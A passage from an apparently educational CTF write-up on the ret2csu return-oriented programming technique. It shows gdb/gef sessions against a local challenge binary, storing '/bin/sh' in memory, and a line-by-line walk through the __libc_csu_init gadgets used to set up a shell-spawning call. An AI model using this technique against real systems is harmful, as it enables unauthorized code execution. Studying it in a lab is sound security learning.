</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">23064</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
</span></span></code></pre></div><p>Let&rsquo;s <code>attach</code> this process to <code>gdb</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">attach</span> <span class="mi">23064</span>
</span></span><span class="line"><span class="cl"><span class="nf">Attaching</span> <span class="no">to</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="p">,</span> <span class="no">process</span> <span class="mi">23064</span>
</span></span><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6...Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">debug</span><span class="c1">//lib/x86_64-linux-gnu/libc-2.27.so...done.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">#3] 0x7fb09f4e21fd → _IO_gets(buf=0x7ffdd9adead0 &#34;&#34;)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">[</span><span class="c1">#4] 0x4005d2 → vulnerable()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">[</span><span class="c1">#5] 0x400623 → main()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fb09f572081</span> <span class="no">in</span> <span class="no">__GI___libc_read</span> <span class="p">(</span><span class="no">fd</span><span class="err">=</span><span class="mi">0x0</span><span class="p">,</span> <span class="no">buf</span><span class="err">=</span><span class="mi">0xca4670</span><span class="p">,</span> <span class="no">nbytes</span><span class="err">=</span><span class="mi">0x1000</span><span class="p">)</span> <span class="no">at</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">sysv</span><span class="err">/</span><span class="no">linux</span><span class="err">/</span><span class="no">read.c</span><span class="p">:</span><span class="mi">27</span>
</span></span><span class="line"><span class="cl"><span class="err">27</span>	<span class="nf">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">sysv</span><span class="err">/</span><span class="no">linux</span><span class="err">/</span><span class="no">read.c</span><span class="p">:</span> <span class="no">No</span> <span class="no">such</span> <span class="no">file</span> <span class="no">or</span> <span class="no">directory.</span>
</span></span></code></pre></div><p>Continuing the process, let&rsquo;s enter the <code>/bin/sh</code> string:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span></span></code></pre></div><p>Well, back to <code>gdb</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">c</span>
</span></span><span class="line"><span class="cl"><span class="nf">Continuing.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Thread</span> <span class="mi">1</span> <span class="err">&#34;</span><span class="no">chall</span><span class="err">&#34;</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="no">fault.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;chall&#34;, stopped 0x7ffdd9adec00 in ?? (), reason: SIGSEGV
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">───────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x7ffdd9adec00 → add DWORD PTR [rax], eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffdd9adec00</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">0x601150</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x601150:</span>	<span class="err">&#34;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span>
</span></span></code></pre></div><p>Great, we stored the string <code>&quot;/bin/sh&quot;</code> at the <code>0x601150</code>.</p>
<h3 id="the-ret2csu-technique" class="relative group">The <code>ret2csu</code> technique <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-ret2csu-technique" aria-label="Anchor">#</a></span></h3><p>We are finally at the main part of this blog post, this is where I will explain the technique very thoroughly, so be sure to pay attention. But, it is time for some code analysis of the gadgets we are going to use:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">__libc_csu_init</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">   <span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400679</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040067d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400681</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400684</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x400670</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400690</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400692</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>These are the instructions we are going to use, we have to break these gadgets in two parts so that we first fill up the registers like <code>r12</code>, <code>r13</code> and others and after that the <code>mov</code> instructions will move the contents to the register we want it to. Let&rsquo;s break the gadgets in <strong>2</strong> parts:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400690</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400692</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>   
</span></span></code></pre></div><p>This would be the first gadgets, first let&rsquo;s work on using these and we will move to the other gadgets:-</p>
<p>Since, <code>r15</code>&rsquo;s content is going in <code>rdx</code>, <code>r14</code>&rsquo;s content is going to <code>rsi</code> and <code>r13d</code>&rsquo;s content is going to <code>rdi</code>. This means, we have to set the contents of these registers to <code>/bin/sh</code>, <code>0</code> and <code>0</code> respectively. Let&rsquo;s work on:-</p>
<blockquote>
<p>Note: The <code>d</code> in <code>r13d</code> means the <code>dword</code>.</p>
</blockquote>
<p>The second ROP gadget:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400679</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040067d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400681</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400684</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x400670</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400690</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400692</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>   
</span></span></code></pre></div><p>For the second part, the one which will transfer the contents of <code>r15</code>, <code>r14</code> and <code>r13</code> to <code>rdx</code>, <code>r14</code> to <code>rsi</code> and <code>r13</code> to <code>edi</code>. But there are some problems, the instructions after those <code>mov</code> instructions need to be handled carefully such that if any one of the values in register,  if wrong, would just discard everything. So, this is the important part, so focus on the explaination and work carefully.</p>
<p>Let&rsquo;s see how we will handle it, line by line:-</p>
<h5 id="call---qword-ptr-r12rbx8" class="relative group"><code>call   QWORD PTR [r12+rbx*8]</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#call---qword-ptr-r12rbx8" aria-label="Anchor">#</a></span></h5><p>This instruction calls a subroutine, now for this we may have to give up something which points to a function which is present in the binary and do not reference to an invalid address. To handle this, we will provide an address from Dynamic section of ELF such that the calling that function won&rsquo;t do any change to the register content, as it should preserve the state of these registers, it also should not point to any an arbitrary address which will cause a breakthrough in the binary workflow. To meet this requirements, we will need either a <code>_init</code> or <code>_fini</code> to preserve the state of register:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">5</span><span class="no">xg</span> <span class="err">&amp;</span><span class="no">_DYNAMIC</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e20:</span>	<span class="err">0</span><span class="nf">x0000000000000001</span>	<span class="mi">0x0000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e30:</span>	<span class="err">0</span><span class="nf">x000000000000000c</span>	<span class="mi">0x0000000000400470</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e40:</span>	<span class="err">0</span><span class="nf">x000000000000000d</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="mi">0x600e30</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e30:</span>	<span class="err">0</span><span class="nf">x000000000000000c</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="mi">0x600e34</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e34:</span>	<span class="err">0</span><span class="nf">x0040047000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="mi">0x600e38</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x600e38:</span>	<span class="err">0</span><span class="nf">x0000000000400470</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="mi">0x0000000000400470</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">_init</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400470</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400474</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200b7d</span><span class="p">]</span>        <span class="c1"># 0x600ff8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040047b</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">test</span>   <span class="no">rax</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040047e</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">je</span>     <span class="mh">0x400482</span> <span class="p">&lt;</span><span class="no">_init</span><span class="p">+</span><span class="mi">18</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400480</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400482</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400486</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><h5 id="0x000000000040067d-77add----rbx0x1" class="relative group"><code>0x000000000040067d &lt;+77&gt;:	add    rbx,0x1</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#0x000000000040067d-77add----rbx0x1" aria-label="Anchor">#</a></span></h5><p>This will increment the value of value of <code>rbx</code> by <code>1</code>.</p>
<h5 id="0x0000000000400681-81cmp----rbprbx" class="relative group"><code>0x0000000000400681 &lt;+81&gt;:	cmp    rbp,rbx</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#0x0000000000400681-81cmp----rbprbx" aria-label="Anchor">#</a></span></h5><p>This will compare the value of <code>rbp</code> with <code>rbx</code>.</p>
<h5 id="0x0000000000400684-84jne----0x400670-__libc_csu_init64" class="relative group"><code>0x0000000000400684 &lt;+84&gt;:	jne    0x400670 &lt;__libc_csu_init+64&gt;</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#0x0000000000400684-84jne----0x400670-__libc_csu_init64" aria-label="Anchor">#</a></span></h5><p>This is a conditional jump, if the value of the <code>cmp rbp, rbx</code> is not equal, this means it&rsquo;ll jump to the instruction stored at <code>__libc_csu_init + 64</code>.</p>
<h5 id="0x0000000000400686-86add----rsp0x8" class="relative group"><code>0x0000000000400686 &lt;+86&gt;:	add    rsp,0x8</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#0x0000000000400686-86add----rsp0x8" aria-label="Anchor">#</a></span></h5><p>This will add the <code>0x8</code> bytes and increase the size of the <code>rsp</code> by it.</p>
<h3 id="the-rop-chain-explanation" class="relative group">The ROP Chain: Explanation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-rop-chain-explanation" aria-label="Anchor">#</a></span></h3><p>Now, let&rsquo;s see exactly what is happening with the chain:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400679</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040067d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400681</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400684</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x400670</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
